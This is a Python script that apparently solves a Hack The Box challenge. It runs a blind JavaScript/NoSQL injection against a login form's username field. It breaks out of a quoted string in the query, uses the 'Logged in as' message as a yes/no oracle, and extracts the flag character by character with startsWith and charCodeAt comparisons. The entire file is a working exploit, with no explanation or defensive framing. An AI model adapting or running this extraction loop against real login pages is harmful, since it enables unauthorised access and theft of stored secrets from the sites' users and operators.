import requests
import json
import string
from urllib.parse import quote_plus

alphabet = string.ascii_lowercase + string.ascii_uppercase
alphabet += string.digits + "_@{}-/()!\"%=^[]:;"
alphabet = string.printable

param_prefix=''
param_suffix='&password=x'
param_name = 'username'
init_value = 'HTB{N0_m0r3_md5'
success_str = 'Logged in as'
schema = 'http://'
fqdn = '139.59.174.176'
port = ':30546'
path = '/index.php'
url = f'{schema}{fqdn}{port}{path}'

def oracle_post(t):
    t = quote_plus('" || (' + t + ') || ""=="') 
    inject = f'{param_name}={t}'
    d = f"{param_prefix}{inject}{param_suffix}"
    #print(d)
    r = requests.post(
        url,
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data = d
    )
    #print(r.text)
    return success_str in r.text


assert (oracle_post('true') == True)
assert (oracle_post('false') == False)

current_value = init_value
finished = False
position = len(init_value)
payload_p = f'this.{param_name}.startsWith("{init_value}")'
assert (oracle_post(payload_p) == True)
while not finished: 
    finished = True
    for c in alphabet:
        payload_s = f'this.{param_name}.charCodeAt({position}) == {ord(c)}'
        #print(c)
        if oracle_post(f'{payload_p} && {payload_s}'): 
            current_value += c
            position += 1
            finished = False
            print(f'[+] current value: {current_value}')
            break 


print("param: " + current_value)
assert (oracle_post(current_value) == True)



